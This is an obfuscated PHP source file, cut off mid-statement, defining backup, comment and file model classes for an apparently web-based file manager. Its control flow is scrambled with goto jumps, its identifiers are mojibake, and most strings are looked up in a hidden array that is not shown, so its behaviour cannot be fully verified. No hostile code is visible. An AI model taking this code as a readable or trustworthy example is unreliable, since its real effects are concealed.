<?php
 goto cğ¶ñë„È”; a»œó²Â‚œ: class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\x2e\x62\141\143\x6b\x75\160\x4c\x69\x73\164"; public $field = array("\151\x6f", "\x6e\141\155\x65", "\163\164\x61\x74\165\x73", "\143\157\x6e\164\x65\x6e\x74", "\x72\x65\163\x75\154\x74", "\164\151\155\145\106\x72\x6f\x6d", "\x74\151\x6d\x65\x54\157"); public function config() { goto FÃ°÷‡ĞÂ»; d»ğ‘êª: Action($CØÛ‰½–’Ì[2101])->taskInit(); $E¢³Ì®››ƒ = Model($CØÛ‰½–’Ì[2102])->listData(); foreach ($E¢³Ì®››ƒ as $Cñ¾ßà³Ï) { if ($Cñ¾ßà³Ï[$CØÛ‰½–’Ì[1080]] == $CØÛ‰½–’Ì[83] && $Cñ¾ßà³Ï[$CØÛ‰½–’Ì[1404]] == $CØÛ‰½–’Ì[2103]) { $bˆ×Ø®Ôí = $Cñ¾ßà³Ï; break; } } goto fø‰ÚÇ¹¥à; FÃ°÷‡ĞÂ»: $CØÛ‰½–’Ì =& $_SERVER[Äº¡•ô™Ÿ]; $bñêğœ–Õá = Model($CØÛ‰½–’Ì[1088])->get($CØÛ‰½–’Ì[715]); $bñêğœ–Õá = json_decode($bñêğœ–Õá, !0); goto d·Ê¼†ÅÈ‹; d·Ê¼†ÅÈ‹: $bñêğœ–Õá = is_array($bñêğœ–Õá) ? $bñêğœ–Õá : array(); if (!isset($bñêğœ–Õá[$CØÛ‰½–’Ì[695]])) { $bñêğœ–Õá[$CØÛ‰½–’Ì[695]] = $CØÛ‰½–’Ì[464]; } $bˆ×Ø®Ôí = array(); goto d»ğ‘êª; fø‰ÚÇ¹¥à: if (isset($bˆ×Ø®Ôí[$CØÛ‰½–’Ì[187]])) { $bˆ×Ø®Ôí[$CØÛ‰½–’Ì[187]] = json_decode($bˆ×Ø®Ôí[$CØÛ‰½–’Ì[187]], !0); } if (isset($bñêğœ–Õá[$CØÛ‰½–’Ì[187]])) { $bˆ×Ø®Ôí[$CØÛ‰½–’Ì[187]][$CØÛ‰½–’Ì[1391]] = $bñêğœ–Õá[$CØÛ‰½–’Ì[187]]; unset($bñêğœ–Õá[$CØÛ‰½–’Ì[187]]); } return array_merge($bˆ×Ø®Ôí, $bñêğœ–Õá); goto Cëñ­Ø­ÍÎ; Cëñ­Ø­ÍÎ: } public function listData($eÎ‡ÑŸ¡¨Ö = false, $Aã®á¿†½Œ = "\x6d\157\144\151\x66\171\x54\151\x6d\x65", $Fñ²—áèÁ« = false) { return parent::listData($eÎ‡ÑŸ¡¨Ö, $Aã®á¿†½Œ, !0); } public function lastItem() { $fğ…ù—ì­§ = $this->listData(); return !empty($fğ…ù—ì­§[0]) ? $fğ…ù—ì­§[0] : null; } public function kill($eÂ×ÀÄ‰Ñ) { goto F†ŒÍ†ƒó; Eß±¨ƒ¬ØŞ: Task::kill($b…ÚÖÂŒ ¸[714]); Task::kill($b…ÚÖÂŒ ¸[732]); Task::kill($b…ÚÖÂŒ ¸[739]); goto cƒ­Æñ¾Ÿ¾; F†ŒÍ†ƒó: $b…ÚÖÂŒ ¸ =& $_SERVER[Äº¡•ô™Ÿ]; $e¯Î¯Œˆ–› = $this->listData($eÂ×ÀÄ‰Ñ); if (!$e¯Î¯Œˆ–› || empty($e¯Î¯Œˆ–›[$b…ÚÖÂŒ ¸[28]])) { return !0; } goto Eß±¨ƒ¬ØŞ; cƒ­Æñ¾Ÿ¾: $dÅ¬ó½øø = $e¯Î¯Œˆ–›[$b…ÚÖÂŒ ¸[28]]; $Aˆ°èô‹¯ = TEMP_FILES . $b…ÚÖÂŒ ¸[713] . $dÅ¬ó½øø . $b…ÚÖÂŒ ¸[8]; IO::remove($Aˆ°èô‹¯, !1); goto Dà„õ®“Õå; Dà„õ®“Õå: return $this->remove($eÂ×ÀÄ‰Ñ); goto B¦î‘…ù¼; B¦î‘…ù¼: } public function remove($bÓĞ‚‚Ïš) { $bµ”õß“Ğ‹ = $this->listData($bÓĞ‚‚Ïš); if (!$bµ”õß“Ğ‹) { return !0; } return $this->backupRemove($bµ”õß“Ğ‹); } private function backupRemove($BÔ×İÇ¢Ü”) { $D°”òŠ‘Ù =& $_SERVER[Äº¡•ô™Ÿ]; parent::remove($BÔ×İÇ¢Ü”[$D°”òŠ‘Ù[364]]); $aÕÇç¸–Ÿ‡ = "\x7b\151\157\72{$BÔ×İÇ¢Ü”[$D°”òŠ‘Ù[694]]}\175\57\x64\x61\x74\x61\142\141\x73\145\x2f\x62\141\143\153\165\160\137" . $BÔ×İÇ¢Ü”[$D°”òŠ‘Ù[28]]; IO::remove($aÕÇç¸–Ÿ‡, !1); return !0; } public function start() { goto dŸõ³‘´·; aö©„ìœã²: if (!$e½¡¿¡‹½->dbFile()) { return !1; } if ($e£¸èœ­¨Œ[$d–ˆ‹íÁÄ[695]] == $d–ˆ‹íÁÄ[464]) { $e½¡¿¡‹½->file(); } Backup::set(array($d–ˆ‹íÁÄ[692] => 1, $d–ˆ‹íÁÄ[706] => time())); goto d°à£¨İ“‹; d°à£¨İ“‹: return !0; goto C—ÀãË×Ú¡; DÚŸ«Êœç: $e½¡¿¡‹½ = new Backup(); $e½¡¿¡‹½->keep(); if (!$e½¡¿¡‹½->db()) { return !1; } goto aö©„ìœã²; dŸõ³‘´·: $d–ˆ‹íÁÄ =& $_SERVER[Äº¡•ô™Ÿ]; if ($GLOBALS[$d–ˆ‹íÁÄ[6]][$d–ˆ‹íÁÄ[84]][$d–ˆ‹íÁÄ[2104]] != $d–ˆ‹íÁÄ[83]) { return !0; } $e£¸èœ­¨Œ = $this->config(); goto eì½Óò‚ƒó; eì½Óò‚ƒó: if (!$e£¸èœ­¨Œ || $e£¸èœ­¨Œ[$d–ˆ‹íÁÄ[1388]] != $d–ˆ‹íÁÄ[83]) { return !1; } $c‡‚ï£ì¾ = $this->process(); foreach ($c‡‚ï£ì¾ as $fŒÁšÉ¢„İ) { if ($fŒÁšÉ¢„İ) { return Task::restart($fŒÁšÉ¢„İ[$d–ˆ‹íÁÄ[364]]); } } goto DÚŸ«Êœç; C—ÀãË×Ú¡: } public function process() { $cÑµô††­ =& $_SERVER[Äº¡•ô™Ÿ]; return array($cÑµô††­[697] => Task::get($cÑµô††­[714]), $cÑµô††­[700] => Task::get($cÑµô††­[732]), $cÑµô††­[164] => Task::get($cÑµô††­[739])); } public function restore() { $CåÄéì’Ë =& $_SERVER[Äº¡•ô™Ÿ]; ActionCall($CåÄéì’Ë[2105], !0, 1); ActionCall($CåÄéì’Ë[2105], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\x6d\145\x6e\x74"; protected $tableMeta = array("\164\x61\x62\154\145\116\141\x6d\x65" => "\x63\x6f\155\x6d\x65\156\164\137\x6d\145\164\141", "\x6d\x65\164\141\x46\x69\x65\x6c\x64" => "\x63\x6f\155\x6d\145\x6e\164\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($B¤ƒÉ†§¼…) { $b”œÒƒµ¾ß =& $_SERVER[Äº¡•ô™Ÿ]; if ($B¤ƒÉ†§¼…[$b”œÒƒµ¾ß[2106]]) { $CÄòøè”¶Ş = $this->where(array($b”œÒƒµ¾ß[2107] => $B¤ƒÉ†§¼…[$b”œÒƒµ¾ß[2106]]))->find(); if (!$CÄòøè”¶Ş || $CÄòøè”¶Ş[$b”œÒƒµ¾ß[368]] != $B¤ƒÉ†§¼…[$b”œÒƒµ¾ß[368]] || $CÄòøè”¶Ş[$b”œÒƒµ¾ß[452]] != $B¤ƒÉ†§¼…[$b”œÒƒµ¾ß[452]]) { return !1; } $this->where(array($b”œÒƒµ¾ß[2107] => $B¤ƒÉ†§¼…[$b”œÒƒµ¾ß[2106]]))->setAdd($b”œÒƒµ¾ß[2108], 1); } return $this->add($B¤ƒÉ†§¼…); } public function remove($c®‡Íï) { $CËù¦ğ’óˆ =& $_SERVER[Äº¡•ô™Ÿ]; $A‹¸Æ†‰–ë = array($CËù¦ğ’óˆ[2107] => $c®‡Íï); $F’¼„¬ÊŠò = $this->where($A‹¸Æ†‰–ë)->find(); if ($F’¼„¬ÊŠò[$CËù¦ğ’óˆ[2106]]) { $this->where(array($CËù¦ğ’óˆ[2107] => $F’¼„¬ÊŠò[$CËù¦ğ’óˆ[2106]]))->setAdd($CËù¦ğ’óˆ[2108], -1); } return $this->where($A‹¸Æ†‰–ë)->delete(); } public function edit($f¯¬µ‘¯ë, $aĞ¡ƒ‡Õèˆ) { $FÓ£œ–¢°¹ =& $_SERVER[Äº¡•ô™Ÿ]; $d‹Û”‘Œõˆ = array($FÓ£œ–¢°¹[2107] => $f¯¬µ‘¯ë); return $this->where($d‹Û”‘Œõˆ)->save(array($FÓ£œ–¢°¹[2109] => $aĞ¡ƒ‡Õèˆ)); } public function prasise($d¦äóºè‰Ç) { $aÔÄ²Õˆ¡ =& $_SERVER[Äº¡•ô™Ÿ]; $b³¨´³„‰š = Model($aÔÄ²Õˆ¡[2110]); $aòòÙ’´¹ = array($aÔÄ²Õˆ¡[2107] => $d¦äóºè‰Ç, $aÔÄ²Õˆ¡[1407] => USER_ID); $eë µŒéÎŠ = $b³¨´³„‰š->where($aòòÙ’´¹)->find(); if (!$eë µŒéÎŠ) { $b³¨´³„‰š->add($aòòÙ’´¹); $B¦»Ø—ïµ = $this->where(array($aÔÄ²Õˆ¡[2107] => $d¦äóºè‰Ç))->setAdd($aÔÄ²Õˆ¡[2111], 1); } else { $b³¨´³„‰š->where($aòòÙ’´¹)->delete(); $B¦»Ø—ïµ = $this->where(array($aÔÄ²Õˆ¡[2107] => $d¦äóºè‰Ç))->setAdd($aÔÄ²Õˆ¡[2111], -1); } return $B¦»Ø—ïµ; } public function targetInfo($FçÏîé‰¡ç, $eÉ¡¾†Áƒ) { goto F¤˜œšã§ã; F¤˜œšã§ã: $có’…ñ‚¶÷ =& $_SERVER[Äº¡•ô™Ÿ]; $cº‘šÛ®ù† = array($có’…ñ‚¶÷[517] => $FçÏîé‰¡ç, $có’…ñ‚¶÷[518] => $eÉ¡¾†Áƒ); $B•ìóŒ½ç¤ = $this->where($cº‘šÛ®ù†)->count(); goto A¶‹¬Â ‚; aåŠßš¤³˜: return $Bğ¯ñâ¼»¼; goto C‡¤È´¡Ÿì; A¶‹¬Â ‚: $eŠß…â¤³ö = "\122\x49\107\110\x54\x20\112\117\x49\116\40{$this->tablePrefix}\143\x6f\155\155\145\156\164\x5f\160\x72\141\151\x73\145\x20\163\164\x61\x72\x20\157\156\x20\x63\157\155\x6d\145\x6e\x74\x2e\x63\x6f\x6d\155\x65\x6e\x74\x49\104\x20\x3d\x20\163\164\x61\x72\56\x63\x6f\x6d\x6d\x65\x6e\x74\x49\104"; $a³ÔœÇ‰Î = $this->alias($có’…ñ‚¶÷[338])->where($cº‘šÛ®ù†)->join($eŠß…â¤³ö, $có’…ñ‚¶÷[2112])->count(); $Bğ¯ñâ¼»¼ = array($có’…ñ‚¶÷[2113] => $B•ìóŒ½ç¤, $có’…ñ‚¶÷[2114] => $a³ÔœÇ‰Î); goto aåŠßš¤³˜; C‡¤È´¡Ÿì: } public function listData($bªŒëñ§ƒñ) { $eºÀÜÁ·è =& $_SERVER[Äº¡•ô™Ÿ]; if (isset($bªŒëñ§ƒñ[$eºÀÜÁ·è[2115]])) { if ($bªŒëñ§ƒñ[$eºÀÜÁ·è[2115]]) { $bªŒëñ§ƒñ[$eºÀÜÁ·è[2116]] = array($eºÀÜÁ·è[930], intval($bªŒëñ§ƒñ[$eºÀÜÁ·è[2115]])); } unset($bªŒëñ§ƒñ[$eºÀÜÁ·è[2115]]); } if (isset($bªŒëñ§ƒñ[$eºÀÜÁ·è[2117]])) { if ($bªŒëñ§ƒñ[$eºÀÜÁ·è[2117]]) { $bªŒëñ§ƒñ[$eºÀÜÁ·è[2116]] = array($eºÀÜÁ·è[927], intval($bªŒëñ§ƒñ[$eºÀÜÁ·è[2117]])); } unset($bªŒëñ§ƒñ[$eºÀÜÁ·è[2117]]); } return $this->_listData($bªŒëñ§ƒñ); } private function _listData($AİÊ™ƒßˆ¶) { $B¢¹ŒèÂÏ“ =& $_SERVER[Äº¡•ô™Ÿ]; $AŞÑÂë‰É = $this->where($AİÊ™ƒßˆ¶)->_makeOrder()->selectPage(100); $this->_listAppendParent($AŞÑÂë‰É[$B¢¹ŒèÂÏ“[351]]); $this->_listAppendUser($AŞÑÂë‰É[$B¢¹ŒèÂÏ“[351]]); $this->_listAppendMeta($AŞÑÂë‰É[$B¢¹ŒèÂÏ“[351]]); return $AŞÑÂë‰É; } private function _makeOrder() { $bßíê±Ûæ§ =& $_SERVER[Äº¡•ô™Ÿ]; $dôÃ§Ò¹×à = array($bßíê±Ûæ§[2111], $bßíê±Ûæ§[2108], $bßíê±Ûæ§[184]); $bÖº¸öÙ¾ = Input::get($bßíê±Ûæ§[403], $bßíê±Ûæ§[7], $bßíê±Ûæ§[386], $dôÃ§Ò¹×à); $a½Š„ÁçÕ = Input::get($bßíê±Ûæ§[404], $bßíê±Ûæ§[7], $bßíê±Ûæ§[1409], array($bßíê±Ûæ§[2118], $bßíê±Ûæ§[401])); $Dğ”¡öÙÅ› = $bÖº¸öÙ¾ . $bßíê±Ûæ§[50] . $a½Š„ÁçÕ; return $this->order($Dğ”¡öÙÅ›); } private function _listAppendParent(&$aÙµ•‰å–ƒ) { goto e³åÂø¯æ²; c©»Ç™ô´: if (!$f«ùÀìÊê») { return; } $fÚÛºƒ×ô = $this->where(array($C½¶¡ïÁÀ[2107] => array($C½¶¡ïÁÀ[7], $f«ùÀìÊê»)))->select(); $fÚÛºƒ×ô = array_to_keyvalue($fÚÛºƒ×ô, $C½¶¡ïÁÀ[2116]); goto DªÄÄ»ŠÄ°; DªÄÄ»ŠÄ°: foreach ($aÙµ•‰å–ƒ as &$aÙĞì¹Ê°ª) { if (isset($fÚÛºƒ×ô[$aÙĞì¹Ê°ª[$C½¶¡ïÁÀ[2106]]])) { $aÙĞì¹Ê°ª[$C½¶¡ïÁÀ[2119]] = $fÚÛºƒ×ô[$aÙĞì¹Ê°ª[$C½¶¡ïÁÀ[2106]]]; } } goto d‚ÓƒœŸÃ‹; e³åÂø¯æ²: $C½¶¡ïÁÀ =& $_SERVER[Äº¡•ô™Ÿ]; $f«ùÀìÊê» = array_unique(array_to_keyvalue($aÙµ•‰å–ƒ, $C½¶¡ïÁÀ[33], $C½¶¡ïÁÀ[2106])); $f«ùÀìÊê» = array_remove_value($f«ùÀìÊê», $C½¶¡ïÁÀ[464]); goto c©»Ç™ô´; d‚ÓƒœŸÃ‹: } private function _listAppendUser(&$CÕ¡ŞéÒ¬) { goto Aš˜£­õàà; Aš˜£­õàà: $d…‚§Ã‰éù =& $_SERVER[Äº¡•ô™Ÿ]; $B·ÑŸ¢ĞßË = array_unique(array_to_keyvalue($CÕ¡ŞéÒ¬, $d…‚§Ã‰éù[33], $d…‚§Ã‰éù[1416])); $B·ÑŸ¢ĞßË = array_remove_value($B·ÑŸ¢ĞßË, $d…‚§Ã‰éù[464]); goto E¨Ş±ƒ–Öä; E¨Ş±ƒ–Öä: if (count($B·ÑŸ¢ĞßË) == 0) { return; } foreach ($CÕ¡ŞéÒ¬ as $bÙô±¶Ñ”˜) { if (isset($bÙô±¶Ñ”˜[$d…‚§Ã‰éù[2119]])) { $B·ÑŸ¢ĞßË[] = $bÙô±¶Ñ”˜[$d…‚§Ã‰éù[2119]][$d…‚§Ã‰éù[1416]]; } } $a›…Ê±˜ô = Model($d…‚§Ã‰éù[473])->userListInfo($B·ÑŸ¢ĞßË); goto f¨ÉöâĞóÃ; f¨ÉöâĞóÃ: foreach ($CÕ¡ŞéÒ¬ as &$bÙô±¶Ñ”˜) { $bÙô±¶Ñ”˜[$d…‚§Ã‰éù[531]] = $a›…Ê±˜ô[$bÙô±¶Ñ”˜[$d…‚§Ã‰éù[1416]]]; if (isset($bÙô±¶Ñ”˜[$d…‚§Ã‰éù[2119]])) { $bÙô±¶Ñ”˜[$d…‚§Ã‰éù[2119]][$d…‚§Ã‰éù[531]] = $a›…Ê±˜ô[$bÙô±¶Ñ”˜[$d…‚§Ã‰éù[2119]][$d…‚§Ã‰éù[1416]]]; } } goto AîœãÃ‡ßÌ; AîœãÃ‡ßÌ: } private function _listAppendMeta(&$aÀæ¯»—) { goto dùê•¾‘©; c¦ªÍ ¬©´: if (!$C—ÊÌëéÚŠ) { return; } foreach ($aÀæ¯»— as $A¦¯™ÈĞèÊ) { if (isset($A¦¯™ÈĞèÊ[$cŒ„˜Óš¬Ë[2119]])) { $C—ÊÌëéÚŠ[] = $A¦¯™ÈĞèÊ[$cŒ„˜Óš¬Ë[2119]][$cŒ„˜Óš¬Ë[2116]]; } } $bà·Ïëë¤­ = $this->metaList($C—ÊÌëéÚŠ); goto f§¿Ü—Çšº; f§¿Ü—Çšº: if (!$bà·Ïëë¤­) { return !1; } foreach ($aÀæ¯»— as &$A¦¯™ÈĞèÊ) { $A¦¯™ÈĞèÊ[$cŒ„˜Óš¬Ë[413]] = $bà·Ïëë¤­[$A¦¯™ÈĞèÊ[$cŒ„˜Óš¬Ë[2116]]]; if (isset($A¦¯™ÈĞèÊ[$cŒ„˜Óš¬Ë[2119]])) { $A¦¯™ÈĞèÊ[$cŒ„˜Óš¬Ë[2119]][$cŒ„˜Óš¬Ë[413]] = $bà·Ïëë¤­[$A¦¯™ÈĞèÊ[$cŒ„˜Óš¬Ë[2119]][$cŒ„˜Óš¬Ë[2116]]]; } } goto c•ÓŠ°í‰‹; dùê•¾‘©: $cŒ„˜Óš¬Ë =& $_SERVER[Äº¡•ô™Ÿ]; $C—ÊÌëéÚŠ = array_unique(array_to_keyvalue($aÀæ¯»—, $cŒ„˜Óš¬Ë[33], $cŒ„˜Óš¬Ë[2116])); $C—ÊÌëéÚŠ = array_remove_value($C—ÊÌëéÚŠ, $cŒ„˜Óš¬Ë[464]); goto c¦ªÍ ¬©´; c•ÓŠ°í‰‹: } private function metaList($aÕŒ¥œÀö) { goto F©ëÏàß¯ë; bâ„¹‹‚«: $D«¢àê‘™÷ = Model($ešï›Ë‡äù[2120])->where($bÛ†½Ø¨)->select(); $D«¢àê‘™÷ = array_to_keyvalue_group($D«¢àê‘™÷, $ešï›Ë‡äù[2116]); foreach ($D«¢àê‘™÷ as $D’ÚŞó¬ß => $dÍ¦ÙëĞ½) { $E’ç„àæÚˆ = array(); foreach ($dÍ¦ÙëĞ½ as $Bë—†´…) { $E’ç„àæÚˆ[$Bë—†´…[$ešï›Ë‡äù[89]]] = $Bë—†´…[$ešï›Ë‡äù[356]]; } $D«¢àê‘™÷[$D’ÚŞó¬ß] = $E’ç„àæÚˆ; } goto DìæŸßç§í; DìæŸßç§í: return $D«¢àê‘™÷ ? $D«¢àê‘™÷ : array(); goto e›ÀƒêØƒœ; F©ëÏàß¯ë: $ešï›Ë‡äù =& $_SERVER[Äº¡•ô™Ÿ]; if (!$aÕŒ¥œÀö) { return array(); } $bÛ†½Ø¨ = array($ešï›Ë‡äù[2116] => array($ešï›Ë‡äù[7], $aÕŒ¥œÀö)); goto bâ„¹‹‚«; e›ÀƒêØƒœ: } } class FileModel extends ModelBase { protected $tableName = "\151\x6f\137\x66\x69\154\x65"; protected $tableMeta = array("\x74\x61\x62\154\x65\x4e\141\155\145" => "\x69\x6f\137\146\x69\154\x65\137\155\x65\164\141", "\x6d\145\164\x61\106\151\x65\154\x64" => "\x66\x69\154\x65\111\x44"); public function fileInfo($a›Â„§ó) { $d Ä¡µØö =& $_SERVER[Äº¡•ô™Ÿ]; static $E›ñ„Ù˜‹ö = array(); if (!isset($E›ñ„Ù˜‹ö[$a›Â„§ó])) { $Eìğ‘ã ¸À = $d Ä¡µØö[2121]; $DËâÏŞ•Æ– = Model($d Ä¡µØö[418])->field($Eìğ‘ã ¸À)->where(array($d Ä¡µØö[416] => $a›Â„§ó))->find(); $E›ñ„Ù˜‹ö[$a›Â„§ó] = $DËâÏŞ•Æ–; } return $E›ñ„Ù˜‹ö[$a›Â„§ó]; } public function addFileByContent($A¦Æ®˜Şä‹ = '', $Bµ¥¥•ïš = '') { goto BñÏöÈŒïÄ; BñÏöÈŒïÄ: $cºˆÉÆÉ†¢ =& $_SERVER[Äº¡•ô™Ÿ]; $bšæ©”–® = TEMP_PATH . $cºˆÉÆÉ†¢[2122]; if (!is_dir($bšæ©”–®)) { mk_dir($bšæ©”–®); } goto a¯¸½Ş‹; a¯¸½Ş‹: $dÑ¨¨––ï = $bšæ©”–® . $cºˆÉÆÉ†¢[2123] . rand_string(16); file_put_contents($dÑ¨¨––ï, $A¦Æ®˜Şä‹); $BìÍä›ñİ” = $this->addFile($dÑ¨¨––ï, $Bµ¥¥•ïš, !0); goto Aæ©Àìİ”Ÿ; Aæ©Àìİ”Ÿ: if (file_exists($dÑ¨¨––ï)) { @unlink($dÑ¨¨––ï); } return $BìÍä›ñİ”; goto a‘øï»Ìêê; a‘øï»Ìêê: } public function createFileName($föÄ‰ëŠÚ) { goto Aõõ±†ö–é; Fåğ¥ù¶Ï£: if (!$AŠ„· ñ¢ && !Cache::get($BÜŠ²•ôÛ)) { $AŠ„· ñ¢ = !0; $CÉŞØ”½£Å = IO::mkdir($cêË¬ÊÜ—¤); if (!IO::exist($CÉŞØ”½£Å . $A°¥ê¸î¾°[2125])) { IO::mkfile($CÉŞØ”½£Å . $A°¥ê¸î¾°[2125]); } Cache::set($BÜŠ²•ôÛ, 1, 3600 * 2); } return $e¶¢ª…â†; goto fÆ Ùùí¥; Dá Ş…µ¯Ü: $cêË¬ÊÜ—¤ = $D¡Ÿ†Èò®±->pathFather($e¶¢ª…â†); static $AŠ„· ñ¢ = false; $BÜŠ²•ôÛ = $A°¥ê¸î¾°[2124] . md5($cêË¬ÊÜ—¤); goto Fåğ¥ù¶Ï£; Aõõ±†ö–é: $A°¥ê¸î¾° =& $_SERVER[Äº¡•ô™Ÿ]; $D¡Ÿ†Èò®± = IO::init($A°¥ê¸î¾°[8]); $e¶¢ª…â† = $this->makeFilePath($föÄ‰ëŠÚ, $D¡Ÿ†Èò®±); goto Dá Ş…µ¯Ü; fÆ Ùùí¥: } public function makeFilePath($CêÙƒÏŸ , $båºßØ±÷—) { goto Bô’ Ñ¾ƒÙ; Bô’ Ñ¾ƒÙ: $a¬Š‹ÎÓ§Â =& $_SERVER[Äº¡•ô™Ÿ]; $D¿º½Å×¢Í = Model($a¬Š‹ÎÓ§Â[1088])->get($a¬Š‹ÎÓ§Â[2126]); $aì¢¸ÄÈï = KodIO::defaultIO() . date($a¬Š‹ÎÓ§Â[2127]); goto CÚ†âßÃöº; CÚ†âßÃöº: $f©¤¶½ÔËî = $aì¢¸ÄÈï . rand_string(5) . short_id(100); $CêÙƒÏŸ  = str_replace($a¬Š‹ÎÓ§Â[8], $a¬Š‹ÎÓ§Â[70], KodIO::clear($CêÙƒÏŸ )); if (!$CêÙƒÏŸ ) { $D¿º½Å×¢Í = $a¬Š‹ÎÓ§Â[2128]; } goto C‘Æœ£ä¥; C‘Æœ£ä¥: switch ($D¿º½Å×¢Í) { case $a¬Š‹ÎÓ§Â[2129]: $f©¤¶½ÔËî = $f©¤¶½ÔËî . $a¬Š‹ÎÓ§Â[93] . $båºßØ±÷—->ext($CêÙƒÏŸ ); if ($båºßØ±÷—->ext($CêÙƒÏŸ ) == $a¬Š‹ÎÓ§Â[2069]) { $f©¤¶½ÔËî .= $a¬Š‹ÎÓ§Â[2130]; } break; case $a¬Š‹ÎÓ§Â[2131]: goto F‚ÔİàòŞ; Fõ¯¸Ğ—¥: if ($båºßØ±÷—->ext($CêÙƒÏŸ ) == $a¬Š‹ÎÓ§Â[2069]) { $CêÙƒÏŸ  .= $a¬Š‹ÎÓ§Â[2130]; } $DÏ¹±ÁÔ†Í = IO::fileNameAuto($aì¢¸ÄÈï, $CêÙƒÏŸ ); $f©¤¶½ÔËî = $aì¢¸ÄÈï . $DÏ¹±ÁÔ†Í; goto A£›Ï…Ö; A£›Ï…Ö: break; goto f‚Âİà—ÂÆ; F‚ÔİàòŞ: $B¡”Ù¦¸ƒå = Model($a¬Š‹ÎÓ§Â[1088])->get($a¬Š‹ÎÓ§Â[1314]); $A„…Ó…çÉ = substr(md5($a¬Š‹ÎÓ§Â[1889] . $B¡”Ù¦¸ƒå . date($a¬Š‹ÎÓ§Â[690])), 0, 8); $aì¢¸ÄÈï = KodIO::defaultIO() . date($a¬Š‹ÎÓ§Â[2132]) . $A„…Ó…çÉ . $a¬Š‹ÎÓ§Â[8]; goto Fõ¯¸Ğ—¥; f‚Âİà—ÂÆ: case $a¬Š‹ÎÓ§Â[2128]: break; default: break; } return $f©¤¶½ÔËî; goto DÙÊ¤øù¥‹; DÙÊ¤øù¥‹: } public function addFileByRemote($fãƒ…£å¦è, $Bé“¶ïãº¥, $a«„ŞÉËÕÔ = array()) { goto eçé¦‡‰‘; eçé¦‡‰‘: $fÙ½ë‹ôïÒ =& $_SERVER[Äº¡•ô™Ÿ]; if (!IO::exist($fãƒ…£å¦è)) { return !1; } $AŞ·ã‰Êä = $a«„ŞÉËÕÔ[$fÙ½ë‹ôïÒ[160]] ? $a«„ŞÉËÕÔ[$fÙ½ë‹ôïÒ[160]] : $fÙ½ë‹ôïÒ[33]; goto D›Œ×ˆ×ê; D›Œ×ˆ×ê: $e¸•»©¯à = IO::hashMd5($fãƒ…£å¦è, $AŞ·ã‰Êä); $aˆ›ïŞ·‹® = KodIO::defaultDriver(); $FŞÚ”ÚÃØ = array($fÙ½ë‹ôïÒ[516] => IO::size($fãƒ…£å¦è), $fÙ½ë‹ôïÒ[2133] => 1, $fÙ½ë‹ôïÒ[383] => $Bé“¶ïãº¥, $fÙ½ë‹ôïÒ[738] => $aˆ›ïŞ·‹®[$fÙ½ë‹ôïÒ[364]], $fÙ½ë‹ôïÒ[384] => $fãƒ…£å¦è, $fÙ½ë‹ôïÒ[2134] => $a«„ŞÉËÕÔ[$fÙ½ë‹ôïÒ[161]] ? $a«„ŞÉËÕÔ[$fÙ½ë‹ôïÒ[161]] : IO::hashSimple($fãƒ…£å¦è), $fÙ½ë‹ôïÒ[2135] => $e¸•»©¯à ? $e¸•»©¯à : $AŞ·ã‰Êä); goto B—ÜÆŞÆš; B—ÜÆŞÆš: if ($Dğí¨¤Ïà· = $this->addFileCheckExist($FŞÚ”ÚÃØ[$fÙ½ë‹ôïÒ[161]], $FŞÚ”ÚÃØ[$fÙ½ë‹ôïÒ[160]], $FŞÚ”ÚÃØ[$fÙ½ë‹ôïÒ[77]])) { return $Dğí¨¤Ïà·; } return $this->addFileData($FŞÚ”ÚÃØ); goto EÛŒ¨¢º¯‡; EÛŒ¨¢º¯‡: } private function addFileData($AºÈª•ì“Ï) { $aáª¸â„ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$AºÈª•ì“Ï) { return !1; } $AºÈª•ì“Ï[$aáª¸â„[77]] = intval($AºÈª•ì“Ï[$aáª¸â„[77]]); if (!$AºÈª•ì“Ï[$aáª¸â„[77]] && strlen($AºÈª•ì“Ï[$aáª¸â„[161]]) > 32) { $AºÈª•ì“Ï[$aáª¸â„[77]] = intval(substr($AºÈª•ì“Ï[$aáª¸â„[161]], 32)); } $eĞì±¹ï£  = $this->add($AºÈª•ì“Ï); return $this->find($eĞì±¹ï£ ); } public function addFile($fÖÙ­·àô, $BØ„¡¢ïò…, $EÂââº÷æÓ = false) { $C™‘’ãÃ¶§ = IO::hashSimple($fÖÙ­·àô); $dˆ¹îñ¦° = IO::hashMd5($fÖÙ­·àô); $F×àØÊ¹¨ = IO::size($fÖÙ­·àô); if ($b£—Æ¼ò»Ø = $this->addFileCheckExist($C™‘’ãÃ¶§, $dˆ¹îñ¦°, $F×àØÊ¹¨)) { return $b£—Æ¼ò»Ø; } $AæÎ•Ø¤¹å = $this->addFileMake($fÖÙ­·àô, $F×àØÊ¹¨, $C™‘’ãÃ¶§, $dˆ¹îñ¦°, $BØ„¡¢ïò…, $EÂââº÷æÓ); return $this->addFileData($AæÎ•Ø¤¹å); } public function addFileMake($AÊå”Ö‘ªÂ, $b¤ÒçİŒ›‰, $B£¨¾éß—¶, $BñÍí§·º…, $c­‚¨ùêÏ—, $a¶ã‡ìÖ¹í) { goto Bá‰Ùƒù»¨; Bá‰Ùƒù»¨: $eÒÙÓ» Û› =& $_SERVER[Äº¡•ô™Ÿ]; $Cƒâ‰ï¥ø¾ = $this->createFileName($c­‚¨ùêÏ—); $CÆâ·ƒºéë = get_path_father($Cƒâ‰ï¥ø¾); goto A‘ßˆ¼—; a¯ÃÍª ÚÑ: $DÃËóÔ¶‰â = KodIO::defaultDriver(); $Eø‚‰Š‡Şé = array($eÒÙÓ» Û›[516] => $b¤ÒçİŒ›‰, $eÒÙÓ» Û›[2133] => 1, $eÒÙÓ» Û›[383] => $c­‚¨ùêÏ—, $eÒÙÓ» Û›[738] => $DÃËóÔ¶‰â[$eÒÙÓ» Û›[364]], $eÒÙÓ» Û›[384] => $Cƒâ‰ï¥ø¾, $eÒÙÓ» Û›[2134] => $B£¨¾éß—¶, $eÒÙÓ» Û›[2135] => $BñÍí§·º…); return $Eø‚‰Š‡Şé; goto dŠ¾äîôš; A‘ßˆ¼—: $dáíª¥·ê = get_path_this($Cƒâ‰ï¥ø¾); if ($a¶ã‡ìÖ¹í) { $C»–âŠÀ = 